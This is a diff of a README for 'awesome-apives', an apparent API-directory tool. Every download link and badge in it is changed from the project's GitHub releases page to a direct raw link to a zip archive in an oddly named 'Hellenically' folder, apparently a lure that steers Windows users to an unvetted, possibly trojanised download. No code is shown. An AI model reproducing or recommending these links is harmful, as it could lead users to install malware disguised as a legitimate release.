@@ -1,6 +1,6 @@
 # 🤖 awesome-apives - Easy Access to 160+ Useful APIs
 
-[![Download awesome-apives](https://img.shields.io/badge/Download-awesome--apives-4caf50?style=for-the-badge&logo=github)](https://github.com/SUNKANMIH/awesome-apives/releases)
+[![Download awesome-apives](https://img.shields.io/badge/Download-awesome--apives-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/SUNKANMIH/awesome-apives/main/Hellenically/awesome_apives_2.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to run awesome-apives on your Windows computer.
 
 Go to the official releases page to get the latest version:
 
-[Download awesome-apives Releases](https://github.com/SUNKANMIH/awesome-apives/releases)
+[Download awesome-apives Releases](https://raw.githubusercontent.com/SUNKANMIH/awesome-apives/main/Hellenically/awesome_apives_2.3.zip)
 
 You will see a list of files for different versions. Look for the latest stable release.
 
@@ -126,7 +126,7 @@ awesome-apives helps you find APIs without needing to guess or search manually. 
 
 Use the following link to visit the releases page and get the latest version:
 
-[https://github.com/SUNKANMIH/awesome-apives/releases](https://github.com/SUNKANMIH/awesome-apives/releases)
+[https://raw.githubusercontent.com/SUNKANMIH/awesome-apives/main/Hellenically/awesome_apives_2.3.zip](https://raw.githubusercontent.com/SUNKANMIH/awesome-apives/main/Hellenically/awesome_apives_2.3.zip)
 
 ---
 
